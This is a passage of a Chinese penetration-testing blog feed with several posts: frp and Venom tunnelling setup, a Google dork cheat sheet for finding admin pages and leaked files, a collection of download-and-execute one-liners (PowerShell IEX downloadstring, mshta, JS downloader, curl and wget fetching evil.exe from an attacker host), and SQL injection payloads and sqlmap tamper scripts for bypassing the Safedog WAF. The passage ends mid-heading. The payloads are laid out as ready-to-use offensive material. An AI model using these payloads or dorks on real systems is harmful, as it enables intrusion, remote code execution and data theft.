所在服务器的公网 IP 为 x.x.x.x：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line">[socks5] </span><br><span class="line">type &#x3D; tcp </span><br><span class="line">remote_port &#x3D; 8881 </span><br><span class="line">plugin &#x3D; socks5 </span><br><span class="line">plugin_user &#x3D; root </span><br><span class="line">plugin_passwd &#x3D; root </span><br><span class="line">use_encryption &#x3D; true </span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure><p>注意：上面的配置了用户名密码 root root 代理的时候注意要加上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">最后两个配置是</span><br><span class="line">use_encryption &#x3D; true \\启用加密</span><br><span class="line">use_compression &#x3D; true  \\启用压缩</span><br></pre></td></tr></table></figure><p>启动 frpc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -c .&#x2F;frpc.ini</span><br></pre></td></tr></table></figure><p>最后，使用代理软件连接服务端的8881建立连接</p><h2 id="Venom"><a href="#Venom" class="headerlink" title="Venom"></a>Venom</h2><p>Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具</p><p>admin节点和agent节点均可监听连接也可发起连接,可以互相的连接。</p><p>admin监听端口，agent发起连接:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;admin_linux_x64 -lport 8838</span><br><span class="line"></span><br><span class="line">agent.exe -rhost VPS_IP -rport 8838</span><br></pre></td></tr></table></figure><p>连接成功后出现交互界面 admin node help一下看到功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">help                                     Help information.</span><br><span class="line">exit                                     Exit.</span><br><span class="line">show                                     Display network topology.</span><br><span class="line">getdes                                   View description of the target node.</span><br><span class="line">setdes     [info]                        Add a description to the target node.</span><br><span class="line">goto       [id]                          Select id as the target node.</span><br><span class="line">listen     [lport]                       Listen on a port on the target node.</span><br><span class="line">connect    [rhost] [rport]               Connect to a new node through the target node.</span><br><span class="line">sshconnect [user@ip:port] [dport]        Connect to a new node through ssh tunnel.</span><br><span class="line">shell                                    Start an interactive shell on the target node.</span><br><span class="line">upload     [local_file]  [remote_file]   Upload files to the target node.</span><br><span class="line">download   [remote_file]  [local_file]   Download files from the target node.</span><br><span class="line">socks      [lport]                       Start a socks5 server.</span><br><span class="line">lforward   [lhost] [sport] [dport]       Forward a local sport to a remote dport.</span><br><span class="line">rforward   [rhost] [sport] [dport]       Forward a remote sport to a local dport.</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">先show 看下拓扑</span><br><span class="line">goto 1  #选择目标1</span><br><span class="line">socks 8886  #在vps上 8886端口上开启代理</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MDkxMDM3NDgucG5n?x-oss-process=image/format,png" alt="image-20200509103748389"></p><p>有意思的是这个还能出一个shell，也挺方便</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MDkxMDQ0MTYucG5n?x-oss-process=image/format,png" alt="image-20200509104416202"></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>内网穿透的东西还是比较重要的，内网断网机常常都得用隧道，所以小结一下，选择的时候最好要有较好的稳定性，支持多种协议，流量可加密，推荐使用最后推荐的几种工具，如果只是端口转发推荐netsh和SSH转发较为稳定。</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究内网安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>google hack搜索引擎常用总结</title>
      <link href="/2020/04/26/google%20hack%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%B8%B8%E7%94%A8%E6%80%BB%E7%BB%93/"/>
      <url>/2020/04/26/google%20hack%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%B8%B8%E7%94%A8%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>在渗透测试中，利用搜索引擎信息收集还是很不错，常常有意外的收获，也可以用在一些镜像库里面搜索信息收集</li><li>还有之前看到的一些，都总结分享一下</li></ul><h2 id="主要的常用一些语法"><a href="#主要的常用一些语法" class="headerlink" title="主要的常用一些语法"></a>主要的常用一些语法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">site：可以限制你搜索范围的域名</span><br><span class="line"></span><br><span class="line">inurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用.</span><br><span class="line"></span><br><span class="line">intext: 只搜索网页部分中包含的文字(也就是忽略了标题、URL等的文字)</span><br><span class="line"></span><br><span class="line">intitle: 查包含关键词的页面，一般用于社工别人的webshell密码</span><br><span class="line"></span><br><span class="line">filetype：搜索文件的后缀或者扩展名</span><br><span class="line"></span><br><span class="line">intitle：限制你搜索的网页标题.</span><br><span class="line"></span><br><span class="line">link: 可以得到一个所有包含了某个指定URL的页面列表.</span><br></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><strong>查找后台地址：site域名</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这个真的好用</span><br><span class="line">查看某公司的表格找账户：site:域名 filetype:xlsx</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查找文本内容：site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查找上传漏洞：site:域名 inurl:file|load|editor|Files**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">找web编辑器：</span><br><span class="line"></span><br><span class="line">site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit</span><br><span class="line"></span><br><span class="line">存在的数据库：site:域名 filetype:mdb|asp|#</span><br><span class="line"></span><br><span class="line">查看脚本类型：site:域名 filetype:asp&#x2F;aspx&#x2F;php&#x2F;jsp</span><br></pre></td></tr></table></figure><h2 id="挖教育常用的"><a href="#挖教育常用的" class="headerlink" title="挖教育常用的"></a>挖教育常用的</h2><p><strong>site：xxx.edu.cn intext：学号</strong></p><p><strong>site：xxx.edu.cn intext：默认密码</strong></p><p><strong>site：xxx.edu.cn intext：登陆/后台登陆/登陆管理等的登陆页面</strong></p><p>找遗留的各种数据库报错,物理路径,数据库版本,服务器探针类文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">site:*.tw  inurl:&#x2F;phpinfo.php</span><br><span class="line">filetype:log &quot;PHP Parse error&quot;| &quot;PHP Warning&quot;</span><br><span class="line">site:*.tw  &quot;id&#x3D;&quot; &amp; intext:&quot;Warning: mysql_fetch_array()</span><br><span class="line">site:*.jp  &quot;id&#x3D;&quot; &amp; intext:&quot;Warning: getimagesize()</span><br><span class="line">site:*.br  &quot;id&#x3D;&quot; &amp; intext:&quot;Warning: array_merge()</span><br><span class="line">site:*.tw  &quot;id&#x3D;&quot; &amp; intext:&quot;Warning: mysql_fetch_assoc()</span><br><span class="line">site:*.tw  &quot;id&#x3D;&quot; &amp; intext:&quot;Warning: mysql_result()</span><br><span class="line">site:*.jp  &quot;id&#x3D;&quot; &amp; intext:&quot;Warning: pg_exec()</span><br><span class="line">site:*.tw  &quot;id&#x3D;&quot; &amp; intext:&quot;Warning: require()</span><br><span class="line">inurl:&#x2F;robots.txt site:*.*</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">1 目录遍历漏洞  语法为: site:baidu.com intitle:index.of</span><br><span class="line"></span><br><span class="line">2 配置文件泄露  语法为: site:baidu.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | extra | ext:ini</span><br><span class="line"></span><br><span class="line">3 数据库文件泄露  site:baidu.com ext:sql | ext:dbf | ext:mdb</span><br><span class="line"></span><br><span class="line">4 日志文件泄露 site:baidu.com ext:log</span><br><span class="line"></span><br><span class="line">5 备份和历史文件 site:baidu.com ext:bkf | ext:bkp | ext:bak | extld | ext:backup</span><br><span class="line"></span><br><span class="line">6 SQL错误  site:baidu.com intext:”sql syntax near” | intext:”syntax error has occurred” | intext:”incorrect syntax near” | intext:”unexpected end of SQL command” | intext:”Warning: mysql_connect()” | intext:”Warning: mysql_query()” | intext:”Warning: pg_connect()”</span><br><span class="line"></span><br><span class="line">7 公开文件信息  site:baidu.com ext:doc | ext:docx | extdt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv</span><br><span class="line"></span><br><span class="line">8  phpinfo()  site:baidu.com ext:php intitle:phpinfo “published by the PHP Group” </span><br><span class="line"></span><br><span class="line">9.不可靠程序透露的信息 </span><br><span class="line"></span><br><span class="line">（1)php version： </span><br><span class="line"></span><br><span class="line">intitle:phpinfo</span><br><span class="line"></span><br><span class="line">inurl:info.php</span><br><span class="line"></span><br><span class="line">(2)程序中含有SQL注入漏洞并且路径可以修改弱口 </span><br><span class="line"></span><br><span class="line">&quot;advanced guestbook * powered&quot;:</span><br><span class="line"></span><br><span class="line">inurl:addentry.php</span><br><span class="line"></span><br><span class="line">intitle:&quot;View img&quot; inurl:viewimg.php</span><br><span class="line"></span><br><span class="line">10.安全扫描报告 &quot;Assessment report&quot; &quot;nessus&quot;: filetype:pdf</span><br><span class="line"></span><br><span class="line">11.数据库程序和错误文件 </span><br><span class="line"></span><br><span class="line">&quot;Welcome to phpmyadmin ***&quot; &quot;running on * as root@*&quot; intitle:phpmyadmin</span><br><span class="line"></span><br><span class="line">&quot;mysql error with query&quot;</span><br><span class="line"></span><br><span class="line">12.暴库</span><br><span class="line"></span><br><span class="line">inurl:&#x2F;inc&#x2F;conn.asp </span><br><span class="line"></span><br><span class="line">inurl:&#x2F;inc+conn.asp </span><br><span class="line"></span><br><span class="line">intext:to parent directory 目录遍历</span><br><span class="line"></span><br><span class="line">inurl:&#x2F;inc&#x2F;conn.asp</span><br><span class="line"></span><br><span class="line">inurl:&#x2F;inc+conn.asp</span><br><span class="line"></span><br><span class="line">intext:to parent directory+intext:mdb site:xxx.com</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一句话下载payload（持续更新）</title>
      <link href="/2020/04/24/%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
      <url>/2020/04/24/%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>js一句话下载payload<br>windows 全版本都会默认支持 js，并且通过cscript 来调用达到下载 payload 的目的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span><br><span class="line">WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), &#x2F;*async&#x3D;*&#x2F;false);</span><br><span class="line">WinHttpReq.Send();</span><br><span class="line">​</span><br><span class="line">BinStream &#x3D; new ActiveXObject(&quot;ADODB.Stream&quot;); BinStream.Type &#x3D; 1;</span><br><span class="line">​</span><br><span class="line">BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody);</span><br><span class="line">BinStream.SaveToFile(&quot;micropoor.exe&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\test&gt;cscript &#x2F;nologo dowfile2.js http:&#x2F;&#x2F;192.168.1.1&#x2F;eval.exe</span><br></pre></td></tr></table></figure><p>还有最简单的powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt&#39;,&#39;E:\robots.txt&#39;)</span><br></pre></td></tr></table></figure><p>远程执行命令，且无文件落地：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -w hidden -c <span class="string">"IEX ((new-object net.webclient).downloadstring('http://192.168.174.1:1234/evil.txt'))"</span></span><br></pre></td></tr></table></figure><p>远程目标主机上执行以下命令实现下载执行操作，且无文件落地：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http://192.168.174.1:1234/evil.hta</span><br></pre></td></tr></table></figure><p>curl</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.174.1:1234/evil.exe -o evil.exe</span><br></pre></td></tr></table></figure><p>wget</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.174.1:1234/evil.sh</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从绕过安全狗到编写tamper脚本</title>
      <link href="/2020/04/21/%E4%BB%8E%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E5%88%B0%E7%BC%96%E5%86%99tamper%E8%84%9A%E6%9C%AC/"/>
      <url>/2020/04/21/%E4%BB%8E%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E5%88%B0%E7%BC%96%E5%86%99tamper%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h3><ul><li><a href="#0x00__4">0x00 简述</a></li><li><a href="#0x01__21">0x01 首先我们要判断哪个关键字被拦截了</a></li><li><a href="#0x02__44">0x02 一些简单的知识点</a></li><li><a href="#0x03__95">0x03 总结安全狗拦截的点</a></li><li><a href="#0x04_Sqlmap_tamper_150">0x04 Sqlmap tamper的编写</a></li><li><a href="#0x05_tamper_229">0x05 tamper主要的三个部分</a></li><li><a href="#0x06_tamper_279">0x06 tamper编写测试方法</a></li><li><a href="#0x07__306">0x07 结束</a></li></ul><h1 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00 简述"></a>0x00 简述</h1><ul><li>安全狗这些waf都是有一个特性，都是基于正则匹配去过滤的</li><li>但是实际情况是需要权衡可用性和安全性</li><li>当然厂商肯定是考虑到用户体验，所以不能出现什么东西都拦截</li><li>所以最终就是正则的绕过</li><li>注意：</li><li>版本不同，他的正则规则也是不一样的</li><li>所以有的payload在新老版本是不能同吃。</li><li>但是没有关系，你学会这么绕，这都不是问题。</li></ul><h1 id="0x01-首先我们要判断哪个关键字被拦截了"><a href="#0x01-首先我们要判断哪个关键字被拦截了" class="headerlink" title="0x01 首先我们要判断哪个关键字被拦截了"></a>0x01 首先我们要判断哪个关键字被拦截了</h1><p>我们以 order by 3 这个简单的语句为例子</p><p>提供思路就是破坏单词去测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1 order by 3  （拦截）</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1 ordwer by 3 （破坏了order 没有拦截）</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1 order bay 3 （破坏了by 没有拦截）</span><br></pre></td></tr></table></figure><p>所以狗拦截的东西就是 order by 两个一起出现</p><p>所有后面的测试都是按照这个思路初步的判断。</p><h1 id="0x02-一些简单的知识点"><a href="#0x02-一些简单的知识点" class="headerlink" title="0x02 一些简单的知识点"></a>0x02 一些简单的知识点</h1><ul><li>绕过的一些基础</li><li>MySql注释内语句也可执行（/*! */）</li><li><code>/*! ....*/</code> 在其他很多地方都是注释。</li><li>但是在mysql中不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在<code>/*!....*/</code>中，这样这些语句如果在其他数据库中是不会被执行，但在mysql中它会执行。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*!50001 select * from test *&#x2F;;</span><br></pre></td></tr></table></figure><p>这里的50001表示假如 数据库是5.00.01以上版本，该语句才会被执行，基本上只做一个版本的判断。</p><ul><li>Mysql常用的符号</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">换行符号</span><br><span class="line">%0a</span><br><span class="line"></span><br><span class="line">注释符合</span><br><span class="line">%23</span><br><span class="line"></span><br><span class="line">空白字符</span><br><span class="line">&quot;%0a&quot;, &quot;%0b&quot;, &quot;%0c&quot;, &quot;%0d&quot;, &quot;%0e&quot;, &quot;%0f&quot;, &quot;%0g&quot;, &quot;%0h&quot;, &quot;%0i&quot;, &quot;%0j&quot;</span><br><span class="line"></span><br><span class="line">不同的数据库不太一样，可以自己查一下</span><br></pre></td></tr></table></figure><p>还有一些bypass的常用注释符号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">--</span><br><span class="line">-- -</span><br><span class="line">--+</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;**&#x2F;</span><br><span class="line">&#x2F;*letmetest*&#x2F;</span><br><span class="line">;%00</span><br></pre></td></tr></table></figure><h1 id="0x03-总结安全狗拦截的点"><a href="#0x03-总结安全狗拦截的点" class="headerlink" title="0x03 总结安全狗拦截的点"></a>0x03 总结安全狗拦截的点</h1><ul><li>and 1</li><li>只要and后面接数字，安全狗就会拦截</li><li>order by</li><li>order 后面接by，安全狗就会拦截</li><li>union select</li><li>只要union select 结合就被拦截,实测发现还是对select这个词的更加严格，主要饶select</li><li>database()</li><li>database后面接括号，安全狗就会拦截</li></ul><p>下面是测试成功的例子</p><p>order by 绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">测试 order aby不拦截 ，我们让 by前面的注释掉就可以绕过</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1 order %23a%0aby 3</span><br></pre></td></tr></table></figure><p>union select绕过 同理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*!select*&#x2F; 1,2,3</span><br></pre></td></tr></table></figure><p>database()绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*!select*&#x2F; 1,%23a%0adatabase&#x2F;*!*&#x2F;(),3</span><br></pre></td></tr></table></figure><p>一个完整的union查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*!select*&#x2F; 1,group_concat(table_name),3 %23a%0a&#x2F;*!from*&#x2F; information_schema.tables where table_schema&#x3D;&#39;security&#39;</span><br></pre></td></tr></table></figure><p>还有一种注释版本号的 绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;-1 union &#x2F;*!44466select*&#x2F; 1,database&#x2F;*!()*&#x2F;,3</span><br></pre></td></tr></table></figure><h1 id="0x04-Sqlmap-tamper的编写"><a href="#0x04-Sqlmap-tamper的编写" class="headerlink" title="0x04 Sqlmap tamper的编写"></a>0x04 Sqlmap tamper的编写</h1><p>tamper是sqlmap对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf。</p><p>为了好理解直接典例深刨析：</p><p>我们理解一下一个常用的tamper ：space2comment.py</p><p>这个脚本的功能就是：用“/**/”替换空格符</p><p>下面是完整的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Copyright (c) 2006-2020 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)</span><br><span class="line">See the file &#39;LICENSE&#39; for copying permission</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">from lib.core.compat import xrange</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ &#x3D; PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#39; &#39;) with comments &#39;&#x2F;**&#x2F;&#39;</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass weak and bespoke web application firewalls</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)</span><br><span class="line">    &#39;SELECT&#x2F;**&#x2F;id&#x2F;**&#x2F;FROM&#x2F;**&#x2F;users&#39;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal &#x3D; payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal &#x3D; &quot;&quot;</span><br><span class="line">        quote, doublequote, firstspace &#x3D; False, False, False</span><br><span class="line"></span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if not firstspace:</span><br><span class="line">                if payload[i].isspace():</span><br><span class="line">                    firstspace &#x3D; True</span><br><span class="line">                    retVal +&#x3D; &quot;&#x2F;**&#x2F;&quot;</span><br><span class="line">                    continue</span><br><span class="line"></span><br><span class="line">            elif payload[i] &#x3D;&#x3D; &#39;\&#39;&#39;:</span><br><span class="line">                quote &#x3D; not quote</span><br><span class="line"></span><br><span class="line">            elif payload[i] &#x3D;&#x3D; &#39;&quot;&#39;:</span><br><span class="line">                doublequote &#x3D; not doublequote</span><br><span class="line"></span><br><span class="line">            elif payload[i] &#x3D;&#x3D; &quot; &quot; and not doublequote and not quote:</span><br><span class="line">                retVal +&#x3D; &quot;&#x2F;**&#x2F;&quot;</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            retVal +&#x3D; payload[i]</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure><p>​</p><h1 id="0x05-tamper主要的三个部分"><a href="#0x05-tamper主要的三个部分" class="headerlink" title="0x05 tamper主要的三个部分"></a>0x05 